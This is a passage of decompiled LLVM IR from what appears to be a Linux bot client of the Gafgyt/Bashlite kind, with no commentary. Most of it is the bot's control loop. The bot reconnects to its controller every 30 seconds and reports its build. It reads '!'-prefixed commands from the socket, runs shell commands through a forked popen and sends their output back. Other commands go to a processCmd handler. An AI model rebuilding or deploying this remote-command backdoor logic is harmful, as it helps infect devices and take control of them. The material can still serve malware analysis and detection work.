  %v0_1000bc1425 = call i32 @initConnection()
  %v3_1000bc1c28 = icmp eq i32 %v0_1000bc1425, 0
  br i1 %v3_1000bc1c28, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc24

dec_label_pc_1000bc24:                            ; preds = %dec_label_pc_1000bc14.outer, %dec_label_pc_1000bc24
  store i32 268483628, i32* @lr, align 4
  %v1_1000bc28 = call i32 @sleep(i32 30)
  %v0_1000bc14 = call i32 @initConnection()
  %v3_1000bc1c = icmp eq i32 %v0_1000bc14, 0
  br i1 %v3_1000bc1c, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc24

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc24, %dec_label_pc_1000bc14.outer
  %v1_1000bc38 = call i32 @getBuild(i32 268632064)
  %v3_1000bc44 = load i32, i32* @global_var_100287f8.254, align 4
  store i32 %v3_1000bc44, i32* %stack_var_-80, align 4
  store i32 268483672, i32* @lr, align 4
  %v3_1000bc54 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000bc5c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000bc78.590 to i32), i32* @lr, align 4
  %v6_1000bc74 = call i32 @sockprintf(i32 %v0_1000bc5c, i32 ptrtoint ([12 x i8]* @global_var_10016b4c.589 to i32), i32 %v1_1000bc38)
  br label %dec_label_pc_1000c490.outer

dec_label_pc_1000bc98:                            ; preds = %dec_label_pc_1000bf4c, %dec_label_pc_1000bef0
  %v1_1000bc9c = mul i32 %storemerge12, 4
  %v3_1000bca8 = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000bcac = add i32 %v3_1000bca8, %v1_1000bc9c
  %v1_1000bcb0 = inttoptr i32 %v2_1000bcac to i32*
  %v2_1000bcb0 = load i32, i32* %v1_1000bcb0, align 4
  store i32 268483780, i32* @lr, align 4
  %v3_1000bcc0 = call i32 @__libc_waitpid(i32 %v2_1000bcb0, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_1000bcc0, 1
  br i1 %tmp110, label %dec_label_pc_1000bee4, label %dec_label_pc_1000bd28

dec_label_pc_1000bce0:                            ; preds = %dec_label_pc_1000bd28, %dec_label_pc_1000bd70
  %v1_1000bce4 = mul i32 %v1_1000bcd4, 4
  %v3_1000bcf0 = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000bcf4 = add i32 %v3_1000bcf0, %v1_1000bce4
  %v1_1000bcf8 = add i32 %v2_1000bcf4, -4
  %v1_1000bd14 = inttoptr i32 %v2_1000bcf4 to i32*
  %v2_1000bd14 = load i32, i32* %v1_1000bd14, align 4
  %v2_1000bd18 = inttoptr i32 %v1_1000bcf8 to i32*
  store i32 %v2_1000bd14, i32* %v2_1000bd18, align 4
  br label %dec_label_pc_1000bd28

dec_label_pc_1000bd28:                            ; preds = %dec_label_pc_1000bc98, %dec_label_pc_1000bce0
  %storemerge18 = phi i32 [ %v1_1000bcd4, %dec_label_pc_1000bce0 ], [ %storemerge12, %dec_label_pc_1000bc98 ]
  %v1_1000bcd4 = add i32 %storemerge18, 1
  %v2_1000bd50 = load i32, i32* @global_var_100287d8.46, align 4
  %v3_1000bd68 = icmp eq i32 %v2_1000bd50, 0
  br i1 %v3_1000bd68, label %dec_label_pc_1000bd70, label %dec_label_pc_1000bce0

dec_label_pc_1000bd70:                            ; preds = %dec_label_pc_1000bd28
  %v3_1000bd54 = load i32, i32* @global_var_100287dc.47, align 4
  %v3_1000bd88 = icmp ugt i32 %v3_1000bd54, %v1_1000bcd4
  br i1 %v3_1000bd88, label %dec_label_pc_1000bce0, label %dec_label_pc_1000bd90

dec_label_pc_1000bd90:                            ; preds = %dec_label_pc_1000bd70
  %v1_1000bd94 = mul i32 %v1_1000bcd4, 4
  %v3_1000bda0 = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000bda4 = add i32 %v1_1000bd94, -4
  %v1_1000bda8 = add i32 %v2_1000bda4, %v3_1000bda0
  %v2_1000bdb0 = inttoptr i32 %v1_1000bda8 to i32*
  store i32 0, i32* %v2_1000bdb0, align 4
  %v3_1000bdbc = load i32, i32* @global_var_100287dc.47, align 4
  %v2_1000bdc0 = load i32, i32* @global_var_100287d8.46, align 4
  %v1_1000bdc4 = add i32 %v3_1000bdbc, -1
  %v2_1000bdc4 = icmp ne i32 %v3_1000bdbc, 0
  %v2_1000bdc8 = zext i1 %v2_1000bdc4 to i32
  %v3_1000bdc8 = add i32 %v2_1000bdc0, -1
  %v4_1000bdc8 = add i32 %v3_1000bdc8, %v2_1000bdc8
  store i32 %v4_1000bdc8, i32* @global_var_100287d8.46, align 4
  store i32 %v1_1000bdc4, i32* @global_var_100287dc.47, align 4
  %v1_1000bdf8 = mul i32 %v1_1000bdc4, 4
  %v1_1000be00 = add i32 %v1_1000bdf8, 4
  store i32 %v1_1000be00, i32* @r3, align 4
  store i32 268484108, i32* @lr, align 4
  %v0_1000be08 = call i32 @malloc()
  br label %dec_label_pc_1000be60

dec_label_pc_1000be20:                            ; preds = %dec_label_pc_1000be60, %dec_label_pc_1000bea8
  %v1_1000be24 = mul i32 %storemerge17, 4
  %v2_1000be30 = add i32 %v1_1000be24, %v0_1000be08
  %v3_1000be44 = load i32, i32* @global_var_10028804.48, align 4
  %v2_1000be48 = add i32 %v3_1000be44, %v1_1000be24
  %v1_1000be4c = inttoptr i32 %v2_1000be48 to i32*
  %v2_1000be4c = load i32, i32* %v1_1000be4c, align 4
  %v2_1000be50 = inttoptr i32 %v2_1000be30 to i32*
  store i32 %v2_1000be4c, i32* %v2_1000be50, align 4
  %v1_1000be58 = add i32 %storemerge17, 1
  br label %dec_label_pc_1000be60

dec_label_pc_1000be60:                            ; preds = %dec_label_pc_1000bd90, %dec_label_pc_1000be20
  %storemerge17 = phi i32 [ 0, %dec_label_pc_1000bd90 ], [ %v1_1000be58, %dec_label_pc_1000be20 ]
  %v2_1000be88 = load i32, i32* @global_var_100287d8.46, align 4
  %v3_1000bea0 = icmp eq i32 %v2_1000be88, 0
  br i1 %v3_1000bea0, label %dec_label_pc_1000bea8, label %dec_label_pc_1000be20

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000be60
  %v3_1000be8c = load i32, i32* @global_var_100287dc.47, align 4
  %v3_1000bec0 = icmp ugt i32 %v3_1000be8c, %storemerge17
  br i1 %v3_1000bec0, label %dec_label_pc_1000be20, label %dec_label_pc_1000bec8

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000bea8
  %v3_1000becc = load i32, i32* @global_var_10028804.48, align 4
  store i32 %v3_1000becc, i32* @r3, align 4
  store i32 268484312, i32* @lr, align 4
  %v0_1000bed4 = call i32 @free()
  store i32 %v0_1000be08, i32* @global_var_10028804.48, align 4
  br label %dec_label_pc_1000bee4

dec_label_pc_1000bee4:                            ; preds = %dec_label_pc_1000bc98, %dec_label_pc_1000bec8
  %v1_1000bee8 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000bef0

dec_label_pc_1000bef0:                            ; preds = %dec_label_pc_1000c490, %dec_label_pc_1000bee4
  %storemerge12 = phi i32 [ %v1_1000bee8, %dec_label_pc_1000bee4 ], [ 0, %dec_label_pc_1000c490 ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_1000bef4 = zext i1 %tmp125 to i32
  %v2_1000bef4 = ashr i32 %storemerge12, 31
  %v3_1000bef4 = and i32 %v2_1000bef4, -2
  %v4_1000bef4 = or i32 %v3_1000bef4, %v1_1000bef4
  %v2_1000bf1c = load i32, i32* @global_var_100287d8.46, align 4
  %v3_1000bf20 = load i32, i32* @global_var_100287dc.47, align 4
  %v3_1000bf34 = icmp ugt i32 %v2_1000bf1c, %v4_1000bef4
  br i1 %v3_1000bf34, label %dec_label_pc_1000bc98, label %dec_label_pc_1000bf3c

dec_label_pc_1000bf3c:                            ; preds = %dec_label_pc_1000bef0
  %v4_1000bf34 = icmp eq i32 %v2_1000bf1c, %v4_1000bef4
  br i1 %v4_1000bf34, label %dec_label_pc_1000bf4c, label %dec_label_pc_1000bf5c

dec_label_pc_1000bf4c:                            ; preds = %dec_label_pc_1000bf3c
  %v3_1000bf54 = icmp ugt i32 %v3_1000bf20, %storemerge12
  br i1 %v3_1000bf54, label %dec_label_pc_1000bc98, label %dec_label_pc_1000bf5c

dec_label_pc_1000bf5c:                            ; preds = %dec_label_pc_1000bf3c, %dec_label_pc_1000bf4c
  %v2_1000bf64 = add i32 %v5_1000c4a8, %v2_1000bf60
  %v3_1000bf6c = add i32 %v2_1000bf64, 1624
  %v4_1000bf6c = inttoptr i32 %v3_1000bf6c to i8*
  store i8 0, i8* %v4_1000bf6c, align 1
  %v1_1000bf78 = call i32 @trim(i32 %v2_1000c498)
  store i32 268484496, i32* @lr, align 4
  %v5_1000bf8c = call i32 @strstr(i32 %v2_1000c498, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10015650.30, i32 0, i32 0), i32 268500992)
  %v4_1000bf98 = icmp eq i32 %v5_1000bf8c, %v2_1000c498
  br i1 %v4_1000bf98, label %dec_label_pc_1000bfa0, label %dec_label_pc_1000bfc0

dec_label_pc_1000bfa0:                            ; preds = %dec_label_pc_1000bf5c
  %v3_1000bfa4 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000bfbc.592 to i32), i32* @lr, align 4
  %v4_1000bfb8 = call i32 @sockprintf(i32 %v3_1000bfa4, i32 ptrtoint ([5 x i8]* @global_var_10016b58.591 to i32), i32 268500992)
  br label %dec_label_pc_1000c490

dec_label_pc_1000bfc0:                            ; preds = %dec_label_pc_1000bf5c
  store i32 268484564, i32* @lr, align 4
  %v5_1000bfd0 = call i32 @strstr(i32 %v2_1000c498, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016b60.593, i32 0, i32 0), i32 268500992)
  %v4_1000bfdc = icmp eq i32 %v5_1000bfd0, %v2_1000c498
  br i1 %v4_1000bfdc, label %dec_label_pc_1000bfe4, label %dec_label_pc_1000c018

dec_label_pc_1000bfe4:                            ; preds = %dec_label_pc_1000bfc0
  %v1_1000bfe8 = add i32 %stack_var_-5748.2.ph, 1
  %v3_1000c000 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_10016b64.594 to i32), i32 268500992)
  %tmp111 = icmp slt i32 %v1_1000bfe8, 21
  br i1 %tmp111, label %dec_label_pc_1000bc14.outer, label %dec_label_pc_1000c010

dec_label_pc_1000c010:                            ; preds = %dec_label_pc_1000bfe4
  %v0_1000c014 = call i32 @__GI_exit()
  br label %dec_label_pc_1000c018

dec_label_pc_1000c018:                            ; preds = %dec_label_pc_1000bfc0, %dec_label_pc_1000c010
  %stack_var_-5748.1 = phi i32 [ %v1_1000bfe8, %dec_label_pc_1000c010 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000bfc0 ]
  %v2_1000c024 = load i8, i8* %v4_1000c4a8, align 4
  %v3_1000c02c = icmp eq i8 %v2_1000c024, 33
  br i1 %v3_1000c02c, label %dec_label_pc_1000c050, label %dec_label_pc_1000c490.outer

dec_label_pc_1000c050:                            ; preds = %dec_label_pc_1000c018, %dec_label_pc_1000c064
  %storemerge = phi i32 [ %v1_1000c038, %dec_label_pc_1000c064 ], [ %v2_1000c498, %dec_label_pc_1000c018 ]
  %v1_1000c038 = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_1000c038 to i8*
  %v2_1000c054 = load i8, i8* %storemerge8, align 1
  %v3_1000c05c = icmp eq i8 %v2_1000c054, 32
  br i1 %v3_1000c05c, label %dec_label_pc_1000c078, label %dec_label_pc_1000c064

dec_label_pc_1000c064:                            ; preds = %dec_label_pc_1000c050
  %v2_1000c068 = load i8, i8* %storemerge8, align 1
  %v3_1000c070 = icmp eq i8 %v2_1000c068, 0
  br i1 %v3_1000c070, label %dec_label_pc_1000c078, label %dec_label_pc_1000c050

dec_label_pc_1000c078:                            ; preds = %dec_label_pc_1000c064, %dec_label_pc_1000c050
  %v2_1000c07c = load i8, i8* %storemerge8, align 1
  %v3_1000c084 = icmp eq i8 %v2_1000c07c, 0
  br i1 %v3_1000c084, label %dec_label_pc_1000c490.outer, label %dec_label_pc_1000c08c

dec_label_pc_1000c08c:                            ; preds = %dec_label_pc_1000c078
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_1000c09c, i32* @r3, align 4
  %v0_1000c0ac = call i32 @__GI_strlen()
  %v2_1000c0bc = add i32 %v0_1000c0ac, %v2_1000c498
  %v1_1000c0c0 = add i32 %v2_1000c0bc, 2
  %v2_1000c10c = add i32 %v2_1000c0bc, 1
  br label %dec_label_pc_1000c0f4

dec_label_pc_1000c0cc:                            ; preds = %dec_label_pc_1000c124, %dec_label_pc_1000c0f4
  store i32 %v1_1000c0c0, i32* @r3, align 4
  %v0_1000c0d4 = call i32 @__GI_strlen()
  %v1_1000c0e8 = add i32 %v0_1000c0d4, %v2_1000c10c
  %v3_1000c0f0 = inttoptr i32 %v1_1000c0e8 to i8*
  store i8 0, i8* %v3_1000c0f0, align 1
  br label %dec_label_pc_1000c0f4

dec_label_pc_1000c0f4:                            ; preds = %dec_label_pc_1000c08c, %dec_label_pc_1000c0cc
  store i32 %v1_1000c0c0, i32* @r3, align 4
  %v0_1000c0fc = call i32 @__GI_strlen()
  %v1_1000c110 = add i32 %v0_1000c0fc, %v2_1000c10c
  %v1_1000c114 = inttoptr i32 %v1_1000c110 to i8*
  %v2_1000c114 = load i8, i8* %v1_1000c114, align 1
  %v3_1000c11c = icmp eq i8 %v2_1000c114, 10
  br i1 %v3_1000c11c, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c124

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c0f4
  store i32 %v1_1000c0c0, i32* @r3, align 4
  %v0_1000c12c = call i32 @__GI_strlen()
  %v1_1000c140 = add i32 %v0_1000c12c, %v2_1000c10c
  %v1_1000c144 = inttoptr i32 %v1_1000c140 to i8*
  %v2_1000c144 = load i8, i8* %v1_1000c144, align 1
  %v3_1000c14c = icmp eq i8 %v2_1000c144, 13
  br i1 %v3_1000c14c, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c16c.preheader

dec_label_pc_1000c16c.preheader:                  ; preds = %dec_label_pc_1000c124
  %stack_var_-5780.029 = inttoptr i32 %v1_1000c0c0 to i8*
  %v2_1000c17030 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000c17834 = icmp eq i8 %v2_1000c17030, 32
  br i1 %v3_1000c17834, label %dec_label_pc_1000c194, label %dec_label_pc_1000c180

dec_label_pc_1000c160:                            ; preds = %dec_label_pc_1000c180
  %v1_1000c164 = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_1000c164 to i8*
  %v2_1000c170 = load i8, i8* %stack_var_-5780.0, align 1
  %v3_1000c178 = icmp eq i8 %v2_1000c170, 32
  br i1 %v3_1000c178, label %dec_label_pc_1000c194, label %dec_label_pc_1000c180

dec_label_pc_1000c180:                            ; preds = %dec_label_pc_1000c16c.preheader, %dec_label_pc_1000c160
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_1000c160 ], [ %stack_var_-5780.029, %dec_label_pc_1000c16c.preheader ]
  %storemerge1935 = phi i32 [ %v1_1000c164, %dec_label_pc_1000c160 ], [ %v1_1000c0c0, %dec_label_pc_1000c16c.preheader ]
  %v2_1000c184 = load i8, i8* %stack_var_-5780.036, align 1
  %v3_1000c18c = icmp eq i8 %v2_1000c184, 0
  br i1 %v3_1000c18c, label %dec_label_pc_1000c194, label %dec_label_pc_1000c160

dec_label_pc_1000c194:                            ; preds = %dec_label_pc_1000c160, %dec_label_pc_1000c180, %dec_label_pc_1000c16c.preheader
  %storemerge19.lcssa = phi i32 [ %v1_1000c0c0, %dec_label_pc_1000c16c.preheader ], [ %v1_1000c164, %dec_label_pc_1000c160 ], [ %storemerge1935, %dec_label_pc_1000c180 ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_1000c16c.preheader ], [ %stack_var_-5780.0, %dec_label_pc_1000c160 ], [ %stack_var_-5780.036, %dec_label_pc_1000c180 ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_1000c1a4 = add i32 %storemerge19.lcssa, 1
  %v2_1000c1f041 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000c1f844 = icmp eq i8 %v2_1000c1f041, 0
  br i1 %v3_1000c1f844, label %dec_label_pc_1000c200, label %dec_label_pc_1000c1b8

dec_label_pc_1000c1b8:                            ; preds = %dec_label_pc_1000c194, %dec_label_pc_1000c1b8
  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_1000c1b8 ], [ %stack_var_-5780.029, %dec_label_pc_1000c194 ]
  %storemerge1445 = phi i32 [ %v1_1000c1e4, %dec_label_pc_1000c1b8 ], [ %v1_1000c0c0, %dec_label_pc_1000c194 ]
  %v3_1000c1bc = load i8, i8* %storemerge746, align 1
  %v4_1000c1bc = zext i8 %v3_1000c1bc to i32
  store i32 268485072, i32* @lr, align 4
  %v3_1000c1cc = call i32 @__GI_toupper(i32 %v4_1000c1bc, i32 %storemerge1445)
  %v1_1000c1dc = trunc i32 %v3_1000c1cc to i8
  store i8 %v1_1000c1dc, i8* %storemerge746, align 1
  %v1_1000c1e4 = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_1000c1e4 to i8*
  %v2_1000c1f0 = load i8, i8* %storemerge7, align 1
  %v3_1000c1f8 = icmp eq i8 %v2_1000c1f0, 0
  br i1 %v3_1000c1f8, label %dec_label_pc_1000c200, label %dec_label_pc_1000c1b8

dec_label_pc_1000c200:                            ; preds = %dec_label_pc_1000c1b8, %dec_label_pc_1000c194
  store i32 ptrtoint ([3 x i8]* @global_var_10016b78.595 to i32), i32* @r4, align 4
  %v4_1000c210 = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([3 x i8]* @global_var_10016b78.595 to i32))
  %v3_1000c218 = icmp eq i32 %v4_1000c210, 0
  br i1 %v3_1000c218, label %dec_label_pc_1000c220, label %dec_label_pc_1000c30c

dec_label_pc_1000c220:                            ; preds = %dec_label_pc_1000c200
  store i32 268485156, i32* @lr, align 4
  %v0_1000c220 = call i32 @listFork()
  %v3_1000c228 = icmp eq i32 %v0_1000c220, 0
  br i1 %v3_1000c228, label %dec_label_pc_1000c230, label %dec_label_pc_1000c490.outer

dec_label_pc_1000c230:                            ; preds = %dec_label_pc_1000c220
  store i32 268485192, i32* @lr, align 4
  %v3_1000c244 = call i32 @__GI_memset(i32 %v2_1000c230, i32 0, i32 1024)
  %v4_1000c264 = call i32 @szprintf(i32 %v2_1000c230, i32 ptrtoint ([8 x i8]* @global_var_10016b7c.596 to i32), i32 %v1_1000c1a4)
  store i32 268485248, i32* @lr, align 4
  %v3_1000c27c = call i32 @fdpopen(i32 %v2_1000c230, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10016b18.574, i32 0, i32 0))
  br label %dec_label_pc_1000c2dc

dec_label_pc_1000c28c:                            ; preds = %dec_label_pc_1000c2dc
  %v1_1000c294 = call i32 @trim(i32 %v2_1000c230)
  %v3_1000c29c = load i32, i32* @global_var_100287d0.29, align 4
  store i32 268485308, i32* @lr, align 4
  %v5_1000c2b8 = call i32 @sockprintf(i32 %v3_1000c29c, i32 ptrtoint ([3 x i8]* @global_var_10016b84.597 to i32), i32 %v2_1000c230)
  store i32 ptrtoint ([3 x i8]* @global_var_1000c2d4.598 to i32), i32* @lr, align 4
  %v3_1000c2d0 = call i32 @__GI_memset(i32 %v2_1000c230, i32 0, i32 1024)
  store i32 268485340, i32* @lr, align 4
  %v1_1000c2d8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000c2dc

dec_label_pc_1000c2dc:                            ; preds = %dec_label_pc_1000c230, %dec_label_pc_1000c28c
  %v3_1000c2ec = call i32 @fdgets(i32 %v2_1000c230, i32 1024, i32 %v3_1000c27c)
  %v3_1000c2f4 = icmp eq i32 %v3_1000c2ec, 0
  br i1 %v3_1000c2f4, label %dec_label_pc_1000c2fc, label %dec_label_pc_1000c28c

dec_label_pc_1000c2fc:                            ; preds = %dec_label_pc_1000c2dc
  %v1_1000c300 = call i32 @fdpclose(i32 %v3_1000c27c)
  %v0_1000c308 = call i32 @__GI_exit()
  br label %dec_label_pc_1000c30c

dec_label_pc_1000c30c:                            ; preds = %dec_label_pc_1000c200, %dec_label_pc_1000c2fc
  store i32 ptrtoint (i32* @global_var_10016b88.601 to i32), i32* @r4, align 4
  store i32 268485416, i32* @lr, align 4
  %v3_1000c324 = call i32 @__GI_strtok(i32 %v1_1000c1a4, i32 ptrtoint (i32* @global_var_10016b88.601 to i32), i32 268500992)
  store i32 %v1_1000c0c0, i32* %stack_var_-5472, align 4
  %v3_1000c41c50 = icmp eq i32 %v3_1000c324, 0
  br i1 %v3_1000c41c50, label %dec_label_pc_1000c424, label %dec_label_pc_1000c33c

dec_label_pc_1000c33c:                            ; preds = %dec_label_pc_1000c30c, %dec_label_pc_1000c400
  %stack_var_-5808.053.in = phi i32 [ %v3_1000c40c, %dec_label_pc_1000c400 ], [ %v3_1000c324, %dec_label_pc_1000c30c ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_1000c400 ], [ 1, %dec_label_pc_1000c30c ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_1000c340 = load i8, i8* %stack_var_-5808.053, align 1
  %v3_1000c348 = icmp eq i8 %v2_1000c340, 10
  br i1 %v3_1000c348, label %dec_label_pc_1000c400, label %dec_label_pc_1000c350

dec_label_pc_1000c350:                            ; preds = %dec_label_pc_1000c33c
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000c35c = call i32 @__GI_strlen()
  %v1_1000c364 = add i32 %v0_1000c35c, 1
  store i32 %v1_1000c364, i32* @r3, align 4
  store i32 268485488, i32* @lr, align 4
  %v0_1000c36c = call i32 @malloc()
  %v0_1000c378 = load i32, i32* @r29, align 4
  %v1_1000c378 = mul i32 %v0_1000c378, 4
  %v1_1000c384 = add i32 %v1_1000c378, %v2_1000c460
  %v2_1000c388 = inttoptr i32 %v1_1000c384 to i32*
  store i32 %v0_1000c36c, i32* %v2_1000c388, align 4
  %v1_1000c390 = mul i32 %stack_var_-5804.151, 4
  %v1_1000c39c = add i32 %v1_1000c390, %v2_1000c460
  %v1_1000c3a0 = inttoptr i32 %v1_1000c39c to i32*
  %v2_1000c3a0 = load i32, i32* %v1_1000c3a0, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000c3ac = call i32 @__GI_strlen()
  %v1_1000c3b4 = add i32 %v0_1000c3ac, 1
  store i32 268485580, i32* @lr, align 4
  %v3_1000c3c8 = call i32 @__GI_memset(i32 %v2_1000c3a0, i32 0, i32 %v1_1000c3b4)
  %v2_1000c3e0 = load i32, i32* %v1_1000c3a0, align 4
  %v4_1000c3f0 = call i32 @strcpy(i32 %v2_1000c3e0, i8* nonnull %stack_var_-5808.053)
  %v1_1000c3f8 = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_1000c400

dec_label_pc_1000c400:                            ; preds = %dec_label_pc_1000c33c, %dec_label_pc_1000c350
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_1000c33c ], [ %v1_1000c3f8, %dec_label_pc_1000c350 ]
  store i32 ptrtoint (i32* @global_var_10016b88.601 to i32), i32* @r4, align 4
  store i32 268485648, i32* @lr, align 4
  %v3_1000c40c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016b88.601 to i32), i32 268500992)
  %v3_1000c41c = icmp eq i32 %v3_1000c40c, 0
  br i1 %v3_1000c41c, label %dec_label_pc_1000c424, label %dec_label_pc_1000c33c

dec_label_pc_1000c424:                            ; preds = %dec_label_pc_1000c400, %dec_label_pc_1000c30c
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_1000c30c ], [ %stack_var_-5804.0, %dec_label_pc_1000c400 ]
  store i32 268485684, i32* @lr, align 4
  %v3_1000c430 = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_1000c490.outer, label %dec_label_pc_1000c454.lr.ph

dec_label_pc_1000c454.lr.ph:                      ; preds = %dec_label_pc_1000c424
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_1000c454

dec_label_pc_1000c454:                            ; preds = %dec_label_pc_1000c454.lr.ph, %dec_label_pc_1000c454
  %v3_1000c454 = phi i32 [ 1, %dec_label_pc_1000c454.lr.ph ], [ %v1_1000c478, %dec_label_pc_1000c454 ]
  %v1_1000c458 = mul i32 %v3_1000c454, 4
  %v1_1000c464 = add i32 %v2_1000c460, %v1_1000c458
  %v1_1000c468 = inttoptr i32 %v1_1000c464 to i32*
  %v2_1000c468 = load i32, i32* %v1_1000c468, align 4
  store i32 %v2_1000c468, i32* @r3, align 4
  store i32 268485748, i32* @lr, align 4
  %v0_1000c470 = call i32 @free()
  %v3_1000c474 = load i32, i32* %stack_var_-5816, align 4
  %v1_1000c478 = add i32 %v3_1000c474, 1
  store i32 %v1_1000c478, i32* %stack_var_-5816, align 4
  %v2_1000c488 = icmp slt i32 %v1_1000c478, %stack_var_-5804.1.lcssa
  br i1 %v2_1000c488, label %dec_label_pc_1000c454, label %dec_label_pc_1000c490.outer

dec_label_pc_1000c490.outer:                      ; preds = %dec_label_pc_1000c454, %dec_label_pc_1000c018, %dec_label_pc_1000c220, %dec_label_pc_1000c424, %dec_label_pc_1000c078, %dec_label_pc_1000bc30
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_1000bc30 ], [ %stack_var_-5748.1, %dec_label_pc_1000c078 ], [ %stack_var_-5748.1, %dec_label_pc_1000c424 ], [ %stack_var_-5748.1, %dec_label_pc_1000c220 ], [ %stack_var_-5748.1, %dec_label_pc_1000c018 ], [ %stack_var_-5748.1, %dec_label_pc_1000c454 ]
  br label %dec_label_pc_1000c490

dec_label_pc_1000c490:                            ; preds = %dec_label_pc_1000c490.outer, %dec_label_pc_1000bfa0
  %v3_1000c494 = load i32, i32* @global_var_100287d0.29, align 4
  %v5_1000c4a8 = call i32 @recvLine(i32 %v3_1000c494, i8* %v4_1000c4a8, i32 4096, i32 %v2_1000c498)
  %v4_1000c4bc = icmp eq i32 %v5_1000c4a8, -1
  br i1 %v4_1000c4bc, label %dec_label_pc_1000bc14.outer, label %dec_label_pc_1000bef0

; uselistorder directives
  uselistorder i32 %v5_1000c4a8, { 1, 0 }
  uselistorder i32 %v1_1000c478, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000c40c, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1000c1e4, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_1000c1a4, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000c0c0, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000c038, { 1, 0 }
  uselistorder i32 %v1_1000bfe8, { 1, 2, 0 }
  uselistorder i32 %v2_1000bf1c, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_1000be24, { 1, 0 }
  uselistorder i32 %v0_1000be08, { 1, 0 }
  uselistorder i32 %v3_1000bdbc, { 1, 0 }
  uselistorder i32 %v1_1000bcd4, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000c460, { 2, 1, 0 }
  uselistorder i32 %v2_1000c230, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_1000c4a8, { 1, 0 }
  uselistorder i32 %v2_1000c498, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_1000bb10, { 1, 0, 2 }
  uselistorder i32 %v2_1000ba9c, { 1, 0, 2 }
  uselistorder i32 %v2_1000ba74, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_1000ba3c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_1000b8dc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10016b88.601 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
